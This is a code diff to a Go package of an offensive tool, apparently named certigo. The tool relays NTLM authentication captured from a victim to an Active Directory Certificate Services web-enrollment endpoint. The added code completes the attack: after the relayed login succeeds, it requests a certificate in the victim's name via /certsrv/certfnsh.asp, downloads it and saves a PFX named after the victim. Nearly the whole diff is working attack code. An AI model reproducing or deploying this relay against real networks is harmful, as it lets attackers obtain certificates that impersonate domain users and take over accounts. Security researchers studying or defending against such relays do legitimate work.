@@ -1,10 +1,10 @@
 // Package relay implements certigo's NTLM-to-AD-CS relay. It listens for
 // inbound HTTP(S) requests, answers with a 401 / WWW-Authenticate challenge
 // to solicit NTLM from the victim, then forwards the NEGOTIATE/AUTHENTICATE
-// tokens to an outbound AD CS web-enrollment endpoint (/certsrv/).
-//
-// This commit wires up the MITM forwarding path only. Certificate issuance
-// on a successful AUTHENTICATE is added in a follow-up commit.
+// tokens to an outbound AD CS web-enrollment endpoint (/certsrv/). Once the
+// victim's AUTHENTICATE is accepted by the CA, the relay posts a CSR to
+// /certsrv/certfnsh.asp, fetches the issued certificate, and drops a PFX
+// under OutDir named after the victim's NTLM user-name field.
 //
 // Limitations:
 //   - HTTP/1.1 only. NTLM is a per-connection protocol; we rely on Go's
@@ -21,9 +21,13 @@
 package relay
 
 import (
+	"bytes"
 	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/pem"
 	"errors"
 	"fmt"
 	"io"
@@ -32,11 +36,15 @@ import (
 	"net/http/cookiejar"
 	"net/url"
 	"os"
+	"path/filepath"
+	"regexp"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
 	"unicode/utf16"
+
+	"github.com/ajm4n/certigo/internal/pki"
 )
 
 // Options configures the relay server.
@@ -147,8 +155,8 @@ func (r *relay) handleHealth(w http.ResponseWriter, _ *http.Request) {
 //     forward to target /certsrv/, read the target's 401 challenge,
 //     reflect it to the client.
 //  3. Authorization: NTLM <b64 AUTHENTICATE> (message type 3):
-//     forward to target on the same outbound session. Cert issuance on
-//     success is wired up in a follow-up commit.
+//     forward to target, extract victim username, on success issue a
+//     cert via /certsrv/certfnsh.asp, save PFX under OutDir.
 func (r *relay) handleRelay(w http.ResponseWriter, req *http.Request) {
 	n := r.hitCount.Add(1)
 	auth := req.Header.Get("Authorization")
@@ -208,11 +216,13 @@ func (r *relay) handleNegotiate(w http.ResponseWriter, req *http.Request, negB64
 }
 
 // handleAuthenticate forwards the AUTHENTICATE blob on the same outbound
-// session and reports whether the target accepted it. Cert issuance is
-// added in a follow-up commit.
+// session. On success, it tries to request a certificate and save a PFX.
 func (r *relay) handleAuthenticate(w http.ResponseWriter, req *http.Request, authB64 string, rawToken []byte) {
 	sess := r.loadSession(req.RemoteAddr)
 	if sess == nil {
+		// Fall back: start a brand-new session. The target will almost
+		// certainly reject this (no matching CHALLENGE), but we still
+		// surface its response.
 		log.Printf("relay: no pending session for %s; starting cold", req.RemoteAddr)
 		sess = r.newSession()
 	}
@@ -236,8 +246,17 @@ func (r *relay) handleAuthenticate(w http.ResponseWriter, req *http.Request, aut
 	}
 	log.Printf("relay: victim=%s authenticated at target (status %d, body=%d bytes)", victim, statusCode, len(body))
 
+	// Try to issue a cert on the victim's authenticated session.
+	certPath, issueErr := sess.issueCert(r.opts, victim)
+	if issueErr != nil {
+		log.Printf("relay: cert issuance failed for %s: %v", victim, issueErr)
+		w.WriteHeader(http.StatusOK)
+		_, _ = fmt.Fprintf(w, "relay: captured auth for %q but cert issuance failed: %v\n", victim, issueErr)
+		return
+	}
+
 	w.WriteHeader(http.StatusOK)
-	_, _ = fmt.Fprintf(w, "relay: captured auth for %q (cert issuance pending)\n", victim)
+	_, _ = fmt.Fprintf(w, "relay: issued cert for %q, saved %s\n", victim, certPath)
 }
 
 // newSession spins up an outbound HTTP client with a cookie jar.
@@ -342,6 +361,89 @@ func (s *session) authenticate(authB64 string) ([]byte, int, error) {
 	return body, resp.StatusCode, nil
 }
 
+// issueCert generates an RSA key + CSR for the victim and POSTs it to
+// /certsrv/certfnsh.asp over the authenticated session, then fetches the
+// issued cert via /certsrv/certnew.cer and writes the PFX to disk.
+func (s *session) issueCert(opts Options, victim string) (string, error) {
+	key, err := pki.GenerateRSAKey(2048)
+	if err != nil {
+		return "", fmt.Errorf("genkey: %w", err)
+	}
+
+	csrDER, err := pki.BuildCSR(key, pki.NewCSRRequest{
+		Subject: pkix.Name{CommonName: sanitizeUser(victim)},
+	})
+	if err != nil {
+		return "", fmt.Errorf("buildcsr: %w", err)
+	}
+	csrPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE REQUEST", Bytes: csrDER})
+
+	base, err := buildCertSrvBase(s.target)
+	if err != nil {
+		return "", err
+	}
+
+	form := url.Values{}
+	form.Set("Mode", "newreq")
+	form.Set("CertRequest", string(csrPEM))
+	form.Set("CertAttrib", fmt.Sprintf("CertificateTemplate:%s\r\n", opts.Template))
+	form.Set("TargetStoreFlags", "0")
+	form.Set("SaveCert", "yes")
+
+	postReq, err := http.NewRequest(http.MethodPost, base+"/certsrv/certfnsh.asp", strings.NewReader(form.Encode()))
+	if err != nil {
+		return "", fmt.Errorf("build certfnsh request: %w", err)
+	}
+	postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	postReq.Header.Set("User-Agent", "certigo-relay/0.1")
+
+	postResp, err := s.outClient.Do(postReq)
+	if err != nil {
+		return "", fmt.Errorf("certfnsh POST: %w", err)
+	}
+	defer func() { _ = postResp.Body.Close() }()
+
+	body, _ := io.ReadAll(postResp.Body)
+	if postResp.StatusCode != http.StatusOK {
+		return "", fmt.Errorf("certfnsh status %d: %s", postResp.StatusCode, truncate(string(body), 200))
+	}
+
+	m := reqIDRegexp.FindStringSubmatch(string(body))
+	if m == nil {
+		return "", fmt.Errorf("ReqID not found in certfnsh response")
+	}
+	reqID := m[1]
+
+	getURL := fmt.Sprintf("%s/certsrv/certnew.cer?ReqID=%s&Enc=b64", base, reqID)
+	getReq, err := http.NewRequest(http.MethodGet, getURL, nil)
+	if err != nil {
+		return "", fmt.Errorf("build certnew request: %w", err)
+	}
+	getReq.Header.Set("User-Agent", "certigo-relay/0.1")
+	getResp, err := s.outClient.Do(getReq)
+	if err != nil {
+		return "", fmt.Errorf("certnew GET: %w", err)
+	}
+	defer func() { _ = getResp.Body.Close() }()
+	certBody, _ := io.ReadAll(getResp.Body)
+
+	cert, err := parseCertResponse(certBody)
+	if err != nil {
+		return "", err
+	}
+
+	pfx, err := pki.SavePFX(&pki.Certificate{Cert: cert, Key: key}, "")
+	if err != nil {
+		return "", fmt.Errorf("encode pfx: %w", err)
+	}
+
+	outPath := filepath.Join(opts.OutDir, sanitizeUser(victim)+".pfx")
+	if err := os.WriteFile(outPath, pfx, 0o600); err != nil {
+		return "", fmt.Errorf("write pfx: %w", err)
+	}
+	return outPath, nil
+}
+
 // --- helpers ---
 
 // parseNTLMAuth accepts "NTLM <b64>" or "Negotiate <b64>" and returns the
@@ -414,4 +516,63 @@ func extractUserName(data []byte) string {
 		pts[i] = binary.LittleEndian.Uint16(raw[2*i : 2*i+2])
 	}
 	return string(utf16.Decode(pts))
+}
+
+// sanitizeUser strips characters that would be unsafe as a filename.
+func sanitizeUser(u string) string {
+	u = strings.TrimSpace(u)
+	if u == "" {
+		return "victim"
+	}
+	var b strings.Builder
+	for _, r := range u {
+		switch {
+		case r == '/' || r == '\\' || r == ':' || r == '*' || r == '?' || r == '"' || r == '<' || r == '>' || r == '|':
+			b.WriteByte('_')
+		case r < 0x20:
+			b.WriteByte('_')
+		default:
+			b.WriteRune(r)
+		}
+	}
+	return b.String()
+}
+
+// buildCertSrvBase returns the scheme://host[:port] prefix of the target URL
+// (dropping any /certsrv/ suffix) so callers can append arbitrary
+// /certsrv/... paths.
+func buildCertSrvBase(target string) (string, error) {
+	u, err := url.Parse(target)
+	if err != nil {
+		return "", fmt.Errorf("parse target: %w", err)
+	}
+	return fmt.Sprintf("%s://%s", u.Scheme, u.Host), nil
+}
+
+var reqIDRegexp = regexp.MustCompile(`ReqID=(\d+)`)
+
+// parseCertResponse returns the parsed X.509 cert from a certnew.cer reply
+// (accepts PEM, raw DER, or base64-encoded DER).
+func parseCertResponse(body []byte) (*x509.Certificate, error) {
+	block, _ := pem.Decode(body)
+	if block != nil && block.Type == "CERTIFICATE" {
+		return x509.ParseCertificate(block.Bytes)
+	}
+	cleaned := bytes.TrimSpace(body)
+	if d, err := base64.StdEncoding.DecodeString(string(cleaned)); err == nil {
+		if c, err := x509.ParseCertificate(d); err == nil {
+			return c, nil
+		}
+	}
+	if c, err := x509.ParseCertificate(body); err == nil {
+		return c, nil
+	}
+	return nil, errors.New("certnew: cannot parse response (not PEM/base64/DER)")
+}
+
+func truncate(s string, n int) string {
+	if len(s) <= n {
+		return s
+	}
+	return s[:n] + "..."
 }
